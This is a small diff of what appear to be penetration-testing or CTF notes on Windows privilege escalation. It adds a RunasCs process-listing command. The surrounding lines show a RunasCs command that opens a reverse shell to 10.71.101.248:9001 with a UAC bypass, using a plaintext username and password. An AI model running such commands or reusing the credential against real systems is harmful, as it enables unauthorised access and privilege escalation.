@@ -117,6 +117,8 @@ https://github.com/antonioCoco/RunasCs
 
  ./RunasCs.exe 071BondarenkoMA Silvercore_21 cmd.exe -r 10.71.101.248:9001 --bypass-uac --logon-type 8
 
+    ./RunasCs.exe x x tasklist -l 9
+
 # SeLoadDriverPrivelege
 
 POC -->compile
